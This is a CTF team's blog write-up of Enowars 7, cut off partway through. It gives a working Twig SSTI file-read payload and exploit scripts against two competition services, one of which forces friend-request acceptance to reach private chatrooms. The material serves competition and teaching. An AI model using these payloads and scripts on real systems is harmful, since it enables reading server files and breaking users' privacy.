<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Enowars 7" /><meta name="author" content="Protag, 12thRockYou" /><meta property="og:locale" content="en" /><meta name="description" content="Oldschool - Twig SSTI" /><meta property="og:description" content="Oldschool - Twig SSTI" /><link rel="canonical" href="https://ireland.re/posts/Enowars7/" /><meta property="og:url" content="https://ireland.re/posts/Enowars7/" /><meta property="og:site_name" content="Ireland.RE" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-07-22T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Enowars 7" /><meta name="twitter:site" content="@LooseSecurity" /><meta name="twitter:creator" content="@Protag, 12thRockYou" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Protag, 12thRockYou"},"dateModified":"2023-08-30T16:10:21+00:00","datePublished":"2023-07-22T00:00:00+00:00","description":"Oldschool - Twig SSTI","headline":"Enowars 7","mainEntityOfPage":{"@type":"WebPage","@id":"https://ireland.re/posts/Enowars7/"},"url":"https://ireland.re/posts/Enowars7/"}</script><title>Enowars 7 | Ireland.RE</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ireland.RE"><meta name="application-name" content="Ireland.RE"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/logo.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ireland.RE</a></div><div class="site-subtitle font-italic">Ireland Without the RE</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/members/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>MEMBERS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ECSCIreland" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LooseSecurity" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['none','none.none'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Enowars 7</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Enowars 7</h1><div class="post-meta text-muted"><div> By <em> <a href="https://ctftime.org/team/179144">Ireland Without the RE</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1689984000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-07-22 </em> </span> <span> Updated <em class="timeago" data-ts="1693411821" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-08-30 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1957 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h1 id="oldschool---twig-ssti">Oldschool - Twig SSTI</h1><p>One of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like <code class="language-plaintext highlighter-rouge">{{7*7}}</code> will result in <code class="language-plaintext highlighter-rouge">49</code></p><p><img data-src="/images/enowars/about.png" alt="about me page" data-proofer-ignore></p><p>We exploiting this in the “About me” section of the user profile</p><p><img data-src="/images/enowars/sstivuln.png" alt="ssti code" data-proofer-ignore></p><p>As a result of this snipped of code. we can pass SSTI payloads into service.</p><p>From testing it seemed RCE was not going to work. We still had file read which is enough for us to exploit this. The following payload is used for file read: <code class="language-plaintext highlighter-rouge">{{ source("grades/file_to_read") }}</code> This would result in an error on the page so it was wrapped in a comment:</p><p>Final payload: <code class="language-plaintext highlighter-rouge">&lt;!-- {{ source("file_we_want_to_read") }} --!&gt; </code></p><p>So we can read any file we want. but we need to read flag files! Looking at the attack.json endpoint we can see what flagstores are useful for Oldschool.</p><p><img data-src="/images/enowars/attackjson.png" alt="attack json file" data-proofer-ignore></p><p>A file is being upload and named <code class="language-plaintext highlighter-rouge">randomints_md5hash</code> this md5 hash. From looking at our own box these files are being saved in <code class="language-plaintext highlighter-rouge">/services/grades/</code></p><p>so we need to read grades/FLAG_ID</p><p>I tested this on the NOP team with a simple payload of : <code class="language-plaintext highlighter-rouge">&lt;!-- {{ source("grades/138219_1143facd439275abb0caed4979e4f8bf") }} --!&gt;</code> and sure enough. the flag was in the source of the page. Now it was just a matter of writing an exploit script that will go to each team and grab that flag.</p><h2 id="exploiting"><span class="mr-2">Exploiting</span><a href="#exploiting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We need to automate out exploit in order to exploit all the teams. To do this, we need a few “stages” to our exploit. the basic plan is:</p><ul><li>Create an account<li>Using that account update About me with out SSTI payload<li>Retrieve and submit the flag</ul><p>We used a random string for the username and password for each account and would make a new account for each attack. The following code will make an account for us:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">username</span> <span class="o">=</span> <span class="n">rand_string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">rand_string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>

<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:9080/index.php?action=register"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">})</span>
</pre></table></code></div></div><p>We than update our profile “about me” with out payload and grab the results of the page:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'about_me'</span><span class="p">:</span> <span class="s">'&lt;!--{{ source("grades/'</span><span class="o">+</span><span class="n">FLAGID</span><span class="o">+</span><span class="s">'") }}--&gt;'</span><span class="p">}</span>
<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:9080/index.php?action=profile"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
<span class="n">profile_page</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:9080/index.php?action=profile"</span><span class="p">).</span><span class="n">text</span>

</pre></table></code></div></div><p>FLAGID and IP are taken from the attack.json endpoint.</p><p>We used this bit of code to only return the flag string from out exploit script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">flag_regex</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">'ENO[A-Za-z0-9+/=]{48}'</span><span class="p">)</span>
<span class="n">flags</span> <span class="o">=</span> <span class="n">flag_regex</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">profile_page</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">flags</span><span class="p">)</span>
</pre></table></code></div></div><p>Our exploit manager handles the submitting of the flag. so printing it out like that is enough for this script.</p><p><img data-src="/images/enowars/gotflag.png" alt="attack json file" data-proofer-ignore></p><p>Full script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>
<span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span>

<span class="k">def</span> <span class="nf">rand_string</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
	<span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>

<span class="n">ip</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">'TARGET_IP'</span><span class="p">)</span>
<span class="n">extra</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">'TARGET_EXTRA'</span><span class="p">))</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">extra</span><span class="p">.</span><span class="n">keys</span><span class="p">():</span>
	<span class="n">FLAGID</span> <span class="o">=</span> <span class="n">extra</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="s">'1'</span><span class="p">][</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

	<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>

	<span class="n">username</span> <span class="o">=</span> <span class="n">rand_string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
	<span class="n">password</span> <span class="o">=</span> <span class="n">rand_string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'about_me'</span><span class="p">:</span> <span class="s">'&lt;!--{{ source("grades/'</span><span class="o">+</span><span class="n">FLAGID</span><span class="o">+</span><span class="s">'") }}--&gt;'</span><span class="p">}</span>

	<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:9080/index.php?action=register"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">})</span>
	<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:9080/index.php?action=profile"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">profile_page</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:9080/index.php?action=profile"</span><span class="p">).</span><span class="n">text</span>

	<span class="n">flag_regex</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">'ENO[A-Za-z0-9+/=]{48}'</span><span class="p">)</span>
	<span class="n">flags</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">flag_regex</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">profile_page</span><span class="p">))</span>
	<span class="k">for</span> <span class="n">flag</span> <span class="ow">in</span> <span class="n">flags</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
		
</pre></table></code></div></div><h1 id="asocialnetwork---broken-access-control">asocialnetwork - Broken Access Control</h1><p>This was wonderfully made social media app. <img data-src="/images/enowars/asocialnetwork.png" alt="home page" data-proofer-ignore></p><p>We found from tulip that the Chatroom will contain a flag. The chatroom that has a flag was the room that a user from the <code class="language-plaintext highlighter-rouge">attack.json</code> file was a part of. The only issue is in order to know that room this user is a part of, you must be their friend, and making friends is hard so lets force them to be our friend.</p><p>When you send a friend request the following request is made: <code class="language-plaintext highlighter-rouge">partner=THEIRNAME&amp;userName=YOURNAME&amp;status=send</code></p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">accept</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">friend</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Acceptance Request not found</span><span class="dl">'</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">friend</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">accepted</span><span class="dl">'</span>
        <span class="k">await</span> <span class="nx">friend</span><span class="p">.</span><span class="nx">save</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>

</pre></table></code></div></div><p>however, you can force them to accept your friend request by changing “send” to “accept”</p><p>There is no check to ensure the user accepting the request is not the user that sent the request.</p><p>So now that we are suddenly very popular. we can view our new friend profile and see what rooms they are part of. (I don’t have any screenshots of this from the live CTF). Viewing their profile gave us a room ID. this room ID was not valid to just join the chatroom. From review of the source code we needed to get the sha256 of that ID. This would let us join the chatroom and get the flag.</p><h2 id="exploiting-1"><span class="mr-2">Exploiting</span><a href="#exploiting-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>For this exploit we need to:</p><ul><li>Make a new account<li>Send a friend request to our new friend<li>Force them to accept it.<li>get the sha256sum of the room ID<li>Visit the room and get the flag</ul><p>First bit is done with this:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">username</span> <span class="o">=</span> <span class="n">rand_string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">rand_string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>

<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3000/register"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s">"confirmPassword"</span><span class="p">:</span><span class="n">password</span><span class="p">})</span>
</pre></table></code></div></div><p>We can than send and accept the friend request with this:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3000/friends/requests/"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"partner"</span><span class="p">:</span><span class="n">FLAGID</span><span class="p">,</span><span class="s">"userName"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">"status"</span><span class="p">:</span><span class="s">"send"</span><span class="p">})</span>
<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3000/friends/requests/"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"partner"</span><span class="p">:</span><span class="n">FLAGID</span><span class="p">,</span><span class="s">"userName"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">"status"</span><span class="p">:</span><span class="s">"accept"</span><span class="p">})</span>
</pre></table></code></div></div><p>The final part is to go to our new friends page. get the ID, hash it and view the chatroom:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">friend_page</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3000/profile/</span><span class="si">{</span><span class="n">FLAGID</span><span class="si">}</span><span class="s">"</span><span class="p">).</span><span class="n">text</span>
<span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'&lt;div class="room"&gt;\s*&lt;h3&gt;(.*?)&lt;/h3&gt;'</span>
<span class="n">test</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span><span class="n">friend_page</span><span class="p">)</span>
<span class="n">roomid_tmp</span> <span class="o">=</span> <span class="n">test</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="n">roomid</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">roomid_tmp</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="n">chatroom</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3000/chatroom/</span><span class="si">{</span><span class="n">roomid</span><span class="si">}</span><span class="s">"</span><span class="p">).</span><span class="n">text</span>

</pre></table></code></div></div><p>Full script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">hashlib</span>


<span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span>
<span class="k">def</span> <span class="nf">rand_string</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
	<span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>

<span class="n">ip</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">'TARGET_IP'</span><span class="p">)</span>
<span class="n">extra</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">'TARGET_EXTRA'</span><span class="p">))</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">extra</span><span class="p">.</span><span class="n">keys</span><span class="p">():</span>
	<span class="n">FLAGID</span> <span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">extra</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="s">'1'</span><span class="p">][</span><span class="mi">0</span><span class="p">])[</span><span class="s">'username'</span><span class="p">]</span>
	<span class="c1">#print(FLAGID)
</span>	<span class="k">try</span><span class="p">:</span>
		<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
		<span class="n">username</span> <span class="o">=</span> <span class="n">rand_string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
		<span class="n">password</span> <span class="o">=</span> <span class="n">rand_string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>

		<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3000/register"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s">"confirmPassword"</span><span class="p">:</span><span class="n">password</span><span class="p">})</span>
		<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3000/friends/requests/"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"partner"</span><span class="p">:</span><span class="n">FLAGID</span><span class="p">,</span><span class="s">"userName"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">"status"</span><span class="p">:</span><span class="s">"send"</span><span class="p">})</span>

		<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3000/friends/requests/"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"partner"</span><span class="p">:</span><span class="n">FLAGID</span><span class="p">,</span><span class="s">"userName"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">"status"</span><span class="p">:</span><span class="s">"accept"</span><span class="p">})</span>

		<span class="n">friend_page</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3000/profile/</span><span class="si">{</span><span class="n">FLAGID</span><span class="si">}</span><span class="s">"</span><span class="p">).</span><span class="n">text</span>
		<span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'&lt;div class="room"&gt;\s*&lt;h3&gt;(.*?)&lt;/h3&gt;'</span>
		<span class="n">test</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span><span class="n">friend_page</span><span class="p">)</span>
		<span class="n">roomid_tmp</span> <span class="o">=</span> <span class="n">test</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
		<span class="n">roomid</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">roomid_tmp</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>

